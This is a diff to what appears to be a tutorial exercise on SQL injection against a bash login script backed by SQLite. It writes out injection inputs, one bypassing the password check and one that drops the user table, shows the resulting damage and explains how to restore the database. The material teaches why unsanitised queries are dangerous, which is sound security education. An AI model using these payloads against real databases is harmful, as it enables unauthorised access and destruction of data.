@@ -127,5 +127,35 @@ Let's just print it from the script!
 $ ./login.sh whatever "' OR 1=1; --"
 SELECT real_name FROM user NATURAL JOIN login WHERE username='whatever' AND password = '' OR 1=1; --';
 
-Is the following valid SQL syntax?
+Is the above valid SQL syntax?
+
+5. The bash script is even more vulnerable than the Java version
+What if the user runs the bash script like this:
+
+$ ./login.sh whatever "' or 1=1;drop table user;--"
+Welcome Rikard Fröberg
+Henrik Sandklef
+
+$ sqlite3 login.db
+SQLite version 3.11.0 2016-02-15 17:29:24
+Enter ".help" for usage hints.
+sqlite> .schema
+CREATE TABLE login(user_id REFERENCES user(user_id) NOT NULL, password TEXT NOT NULL, PRIMARY KEY(user_id, password));
+sqlite>
+
+Oooops! What happened to the user table? It was dropped!
+
+Restore your database like this:
+
+$ sqlite3 login.db < login.sql
+
+Don't worry about the errors, they come from the fact that the login table was intact
+and cannot be recreated, and that the user_id - password combination is primary key
+so the same values cannot be inserted again.
+
+Now, verify that you can do a "real" login:
+
+$ ./login.sh rikard sikrit
+Welcome Rikard Fröberg
+
 
